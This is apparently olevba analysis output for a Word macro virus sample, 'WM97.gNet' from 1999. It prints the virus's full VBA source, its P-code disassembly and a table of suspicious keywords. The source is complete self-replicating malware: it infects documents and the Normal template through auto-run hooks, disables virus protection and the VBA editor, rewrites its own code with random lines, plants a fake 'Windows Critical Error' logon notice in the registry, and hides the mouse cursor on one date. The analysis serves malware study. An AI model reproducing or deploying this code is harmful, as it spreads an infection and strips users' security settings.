olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Gnet
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Gnet - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO gNet.bas 
in file: Virus.MSWord.Gnet - OLE stream: 'Macros/VBA/gNet'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' This is gNet Macro Virus version 2
' (c) 1999 by ksg
' astigmatiZm virus group
' www.astigmatiZm.cjb.net
' rename this file to gNet.bas and import it in MS Words Visual Basic Editor to activate

Declare Function ShowCursor Lib "USER32" (ByVal fShow As Integer) As Integer

'----------------------
'  WM97.gNet version 2
' ---------------------
' (c) by KSG [ AMACC ]
' ---------------------
'   [ Astig Matizm ]
'

Sub main()
        On Error Resume Next
        Set ksg = Application.VBE.ActiveVBProject.VBComponents: Set tre = CodeModule
        Set cb = CommandBars: Set cbvisible = Visible: Set cbProtection = Protection
        k$ = "Fa": s$ = "lse"
        WordBasic.DisableAutoMacros 0
        cb("Visual Basic").cbvisible = False
        cb("Visual Basic").Enabled = False
        cb("Visual Basic").cbProtection = msoBarNoChangeVisible
        cb("Visual Basic").cbProtection = msoBarNoCustomize
        cb("Tools").Controls("Macro").Delete
        cb("Tools").Controls("Customize...").Delete
        CustomizationContext = NormalTemplate
        FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
        FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
        AtiveDocument.ReadOnlyRecommended = False
        System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Winlogon", "LegalNoticeCaption") = "Windows Critical Error"
        System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Winlogon", "LegalNoticeText") = "This version of Windows is not Y2K ready. Please Upgrade Today! www.microsoft.com"
        
                With Application
                        .EnableCancelKey = wdCancelDisabled
                        .DisplayAlerts = wdAlertsNone
                End With
                
                With Options
                        .ConfirmConversions = k$ + s$
                        .VirusProtection = k$ + s$
                End With

        Randomize

        ActiveLines = ksg("gNet").tre.CountOfLines
        
        If ActiveLines > 300 Then
                        With ksg("gNet").tre
        
        For TheLine = 1 To .CountOfLines
                If Left(.Lines(TheLine, 1), 3) = "Rem" Then .DeleteLines TheLine
        Next TheLine
        End With
        Else
                With ksg("gNet").tre
                vsize = Int(Rnd * 10)
        For loop1 = 1 To vsize
                pstring = ""
                PolyLines = .CountOfLines
                RndLine = Int(Rnd * PolyLines) + 1
                psize = Int(Rnd * 39) + 1
        For loop2 = 1 To psize
                pstring = pstring & Chr(65 + Int(Rnd * 22)) & Chr(122 - Int(Rnd * 22))
        Next loop2
                .InsertLines RndLine, "Rem " & pstring
        Next loop1

        End With
        End If
        If Day(Now()) = 10 And Month(Now()) = 9 Then Call Payload

End Sub

Sub Payload()
On Error Resume Next

Assistant.Visible = True

With Assistant.NewBalloon
        .Icon = msoIconAlert
        .Text = "W 9 7 M . g N e t   b y   k s g" & vbCr & "" & vbCr & "  www.astigmatiZm.cjb.net "
        .Heading = "astigmatiZm VX Team"
        .Animation = msoAnimationSearching
        .Show
End With

Assistant.Visible = False

While ShowCursor(False) >= 0
Wend

End Sub

Sub Routine()
On Error Resume Next

        Set amt = NormalTemplate.VBProject.VBComponents
        Set ksg = Application.VBE.ActiveVBProject.VBComponents: Set tre = CodeModule
        Application.EnableCancelKey = wdCancelDisabled

With Options
        .SaveNormalPrompt = (Rnd * 0)
        .VirusProtection = (Rnd * 0)
        .ConfirmConversions = (Rnd * 0)
End With
ksg("gNet").Export "C:\gNet.sys"

        For x = 1 To amt.Count
        
                If amt(x).Name = "gNet" Then var1 = True
        
        Next x

        For y = 1 To ActiveDocument.VBProject.VBComponents.Count
        
                If ActiveDocument.VBProject.VBComponents(y).Name = "gNet" Then varmain = True
        
        Next y

        If var1 = True And varmain = False Then Set adp = ActiveDocument.VBProject
        If var1 = False And varmain = True Then Set adp = NormalTemplate.VBProject
        If var1 = True And varmain = True Then GoTo labas

        adp.VBComponents.Import "C:\gNet.sys"

        If varmain = False Then ActiveDocument.SaveAs (WordBasic.[FileName$]()), FileFormat:=wdFormatDocument
        If var1 = False Then NormalTemplate.Save

labas:
        Call main
        
        Shell "attrib +h c:\gNet.sys", vbHide

End Sub

Sub AutoOpen()
        On Error Resume Next
        Call Routine
        Call main
End Sub

Sub AutoNew()
        On Error Resume Next
        Call Routine
        Call main
End Sub

Sub FileSave()
        On Error Resume Next
        Call Routine
        Call main
        ActiveDocument.Save
End Sub

Sub FileSaveAs()
        On Error Resume Next
        Call Routine
        Call main
        Dialogs(wdDialogFileSaveAs).Show
End Sub

Sub fclosedlg()
        On Error Resume Next
        Call Routine
        Call main
        WordBasic.FileClose dlg
End Sub

Sub fsavedlg()
        On Error Resume Next
        Call Routine
        Call main
        ActiveDocument.Save
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Gnet
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/gNet - 15114 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0023 " This is gNet Macro Virus version 2"
' Line #1:
' 	QuoteRem 0x0000 0x0010 " (c) 1999 by ksg"
' Line #2:
' 	QuoteRem 0x0000 0x0018 " astigmatiZm virus group"
' Line #3:
' 	QuoteRem 0x0000 0x0018 " www.astigmatiZm.cjb.net"
' Line #4:
' 	QuoteRem 0x0000 0x0057 " rename this file to gNet.bas and import it in MS Words Visual Basic Editor to activate"
' Line #5:
' Line #6:
' 	FuncDefn (Declare Function ShowCursor Lib "USER32" (ByVal fShow As Integer) As Integer)
' Line #7:
' Line #8:
' 	QuoteRem 0x0000 0x0016 "----------------------"
' Line #9:
' 	QuoteRem 0x0000 0x0015 "  WM97.gNet version 2"
' Line #10:
' 	QuoteRem 0x0000 0x0016 " ---------------------"
' Line #11:
' 	QuoteRem 0x0000 0x0015 " (c) by KSG [ AMACC ]"
' Line #12:
' 	QuoteRem 0x0000 0x0016 " ---------------------"
' Line #13:
' 	QuoteRem 0x0000 0x0013 "   [ Astig Matizm ]"
' Line #14:
' 	QuoteRem 0x0000 0x0000 ""
' Line #15:
' Line #16:
' 	FuncDefn (Sub main())
' Line #17:
' 	OnError (Resume Next) 
' Line #18:
' 	SetStmt 
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	MemLd VBComponents 
' 	Set ksg 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld CodeModule 
' 	Set tre 
' Line #19:
' 	SetStmt 
' 	Ld CommandBars 
' 	Set cb 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld Visible 
' 	Set cbvisible 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld Protection 
' 	Set cbProtection 
' Line #20:
' 	LitStr 0x0002 "Fa"
' 	St k$ 
' 	BoS 0x0000 
' 	LitStr 0x0003 "lse"
' 	St s$ 
' Line #21:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #22:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd cb 0x0001 
' 	MemSt cbvisible 
' Line #23:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd cb 0x0001 
' 	MemSt Enabled 
' Line #24:
' 	Ld msoBarNoChangeVisible 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd cb 0x0001 
' 	MemSt cbProtection 
' Line #25:
' 	Ld msoBarNoCustomize 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd cb 0x0001 
' 	MemSt cbProtection 
' Line #26:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd cb 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #27:
' 	LitStr 0x000C "Customize..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd cb 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #28:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #29:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #30:
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #31:
' 	LitVarSpecial (False)
' 	Ld AtiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #32:
' 	LitStr 0x0016 "Windows Critical Error"
' 	LitStr 0x0000 ""
' 	LitStr 0x0045 "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Winlogon"
' 	LitStr 0x0012 "LegalNoticeCaption"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #33:
' 	LitStr 0x0051 "This version of Windows is not Y2K ready. Please Upgrade Today! www.microsoft.com"
' 	LitStr 0x0000 ""
' 	LitStr 0x0045 "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Winlogon"
' 	LitStr 0x000F "LegalNoticeText"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #34:
' Line #35:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #36:
' 	Ld wdCancelDisabled 
' 	MemStWith EnableCancelKey 
' Line #37:
' 	Ld wdAlertsNone 
' 	MemStWith DisplayAlerts 
' Line #38:
' 	EndWith 
' Line #39:
' Line #40:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #41:
' 	Ld k$ 
' 	Ld s$ 
' 	Add 
' 	MemStWith ConfirmConversions 
' Line #42:
' 	Ld k$ 
' 	Ld s$ 
' 	Add 
' 	MemStWith VirusProtection 
' Line #43:
' 	EndWith 
' Line #44:
' Line #45:
' 	ArgsCall Read 0x0000 
' Line #46:
' Line #47:
' 	LitStr 0x0004 "gNet"
' 	ArgsLd ksg 0x0001 
' 	MemLd tre 
' 	MemLd CountOfLines 
' 	St ActiveLines 
' Line #48:
' Line #49:
' 	Ld ActiveLines 
' 	LitDI2 0x012C 
' 	Gt 
' 	IfBlock 
' Line #50:
' 	StartWithExpr 
' 	LitStr 0x0004 "gNet"
' 	ArgsLd ksg 0x0001 
' 	MemLd tre 
' 	With 
' Line #51:
' Line #52:
' 	StartForVariable 
' 	Ld TheLine 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	For 
' Line #53:
' 	Ld TheLine 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Rem"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld TheLine 
' 	ArgsMemCallWith DeleteLines 0x0001 
' 	EndIf 
' Line #54:
' 	StartForVariable 
' 	Ld TheLine 
' 	EndForVariable 
' 	NextVar 
' Line #55:
' 	EndWith 
' Line #56:
' 	ElseBlock 
' Line #57:
' 	StartWithExpr 
' 	LitStr 0x0004 "gNet"
' 	ArgsLd ksg 0x0001 
' 	MemLd tre 
' 	With 
' Line #58:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	St vsize 
' Line #59:
' 	StartForVariable 
' 	Ld loop1 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld vsize 
' 	For 
' Line #60:
' 	LitStr 0x0000 ""
' 	St pstring 
' Line #61:
' 	MemLdWith CountOfLines 
' 	St PolyLines 
' Line #62:
' 	Ld Rnd 
' 	Ld PolyLines 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St RndLine 
' Line #63:
' 	Ld Rnd 
' 	LitDI2 0x0027 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St psize 
' Line #64:
' 	StartForVariable 
' 	Ld loop2 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld psize 
' 	For 
' Line #65:
' 	Ld pstring 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St pstring 
' Line #66:
' 	StartForVariable 
' 	Ld loop2 
' 	EndForVariable 
' 	NextVar 
' Line #67:
' 	Ld RndLine 
' 	LitStr 0x0004 "Rem "
' 	Ld pstring 
' 	Concat 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #68:
' 	StartForVariable 
' 	Ld loop1 
' 	EndForVariable 
' 	NextVar 
' Line #69:
' Line #70:
' 	EndWith 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000A 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0009 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Payload 0x0000 
' 	EndIf 
' Line #73:
' Line #74:
' 	EndSub 
' Line #75:
' Line #76:
' 	FuncDefn (Sub Payload())
' Line #77:
' 	OnError (Resume Next) 
' Line #78:
' Line #79:
' 	LitVarSpecial (True)
' 	Ld Assistant 
' 	MemSt Visible 
' Line #80:
' Line #81:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #82:
' 	Ld msoIconAlert 
' 	MemStWith Icon 
' Line #83:
' 	LitStr 0x001F "W 9 7 M . g N e t   b y   k s g"
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0000 ""
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x001A "  www.astigmatiZm.cjb.net "
' 	Concat 
' 	MemStWith Then 
' Line #84:
' 	LitStr 0x0013 "astigmatiZm VX Team"
' 	MemStWith Heading 
' Line #85:
' 	Ld msoAnimationSearching 
' 	MemStWith Animation 
' Line #86:
' 	ArgsMemCallWith Show 0x0000 
' Line #87:
' 	EndWith 
' Line #88:
' Line #89:
' 	LitVarSpecial (False)
' 	Ld Assistant 
' 	MemSt Visible 
' Line #90:
' Line #91:
' 	LitVarSpecial (False)
' 	ArgsLd ShowCursor 0x0001 
' 	LitDI2 0x0000 
' 	Ge 
' 	While 
' Line #92:
' 	Wend 
' Line #93:
' Line #94:
' 	EndSub 
' Line #95:
' Line #96:
' 	FuncDefn (Sub Routine())
' Line #97:
' 	OnError (Resume Next) 
' Line #98:
' Line #99:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set amt 
' Line #100:
' 	SetStmt 
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	MemLd VBComponents 
' 	Set ksg 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld CodeModule 
' 	Set tre 
' Line #101:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #102:
' Line #103:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #104:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	MemStWith SaveNormalPrompt 
' Line #105:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	MemStWith VirusProtection 
' Line #106:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	MemStWith ConfirmConversions 
' Line #107:
' 	EndWith 
' Line #108:
' 	LitStr 0x000B "C:\gNet.sys"
' 	LitStr 0x0004 "gNet"
' 	ArgsLd ksg 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #109:
' Line #110:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld amt 
' 	MemLd Count 
' 	For 
' Line #111:
' Line #112:
' 	Ld x 
' 	ArgsLd amt 0x0001 
' 	MemLd New 
' 	LitStr 0x0004 "gNet"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St var1 
' 	EndIf 
' Line #113:
' Line #114:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #115:
' Line #116:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #117:
' Line #118:
' 	Ld y 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0004 "gNet"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St varmain 
' 	EndIf 
' Line #119:
' Line #120:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #121:
' Line #122:
' 	Ld var1 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld varmain 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set adp 
' 	EndIf 
' Line #123:
' 	Ld var1 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld varmain 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set adp 
' 	EndIf 
' Line #124:
' 	Ld var1 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld varmain 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo labas 
' 	EndIf 
' Line #125:
' Line #126:
' 	LitStr 0x000B "C:\gNet.sys"
' 	Ld adp 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #127:
' Line #128:
' 	Ld varmain 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	Paren 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	EndIf 
' Line #129:
' 	Ld var1 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #130:
' Line #131:
' 	Label labas 
' Line #132:
' 	ArgsCall (Call) main 0x0000 
' Line #133:
' Line #134:
' 	LitStr 0x0015 "attrib +h c:\gNet.sys"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #135:
' Line #136:
' 	EndSub 
' Line #137:
' Line #138:
' 	FuncDefn (Sub AutoOpen())
' Line #139:
' 	OnError (Resume Next) 
' Line #140:
' 	ArgsCall (Call) Routine 0x0000 
' Line #141:
' 	ArgsCall (Call) main 0x0000 
' Line #142:
' 	EndSub 
' Line #143:
' Line #144:
' 	FuncDefn (Sub AutoNew())
' Line #145:
' 	OnError (Resume Next) 
' Line #146:
' 	ArgsCall (Call) Routine 0x0000 
' Line #147:
' 	ArgsCall (Call) main 0x0000 
' Line #148:
' 	EndSub 
' Line #149:
' Line #150:
' 	FuncDefn (Sub FileSave())
' Line #151:
' 	OnError (Resume Next) 
' Line #152:
' 	ArgsCall (Call) Routine 0x0000 
' Line #153:
' 	ArgsCall (Call) main 0x0000 
' Line #154:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #155:
' 	EndSub 
' Line #156:
' Line #157:
' 	FuncDefn (Sub FileSaveAs())
' Line #158:
' 	OnError (Resume Next) 
' Line #159:
' 	ArgsCall (Call) Routine 0x0000 
' Line #160:
' 	ArgsCall (Call) main 0x0000 
' Line #161:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #162:
' 	EndSub 
' Line #163:
' Line #164:
' 	FuncDefn (Sub fclosedlg())
' Line #165:
' 	OnError (Resume Next) 
' Line #166:
' 	ArgsCall (Call) Routine 0x0000 
' Line #167:
' 	ArgsCall (Call) main 0x0000 
' Line #168:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileClose 0x0001 
' Line #169:
' 	EndSub 
' Line #170:
' Line #171:
' 	FuncDefn (Sub fsavedlg())
' Line #172:
' 	OnError (Resume Next) 
' Line #173:
' 	ArgsCall (Call) Routine 0x0000 
' Line #174:
' 	ArgsCall (Call) main 0x0000 
' Line #175:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #176:
' 	EndSub 
' Line #177:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

